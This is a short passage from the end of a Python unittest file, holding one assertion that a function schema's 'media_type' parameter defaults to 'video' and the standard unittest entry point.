        self.assertEqual(video_fn["parameters"]["properties"]["media_type"]["default"], "video")


if __name__ == "__main__":
    unittest.main()
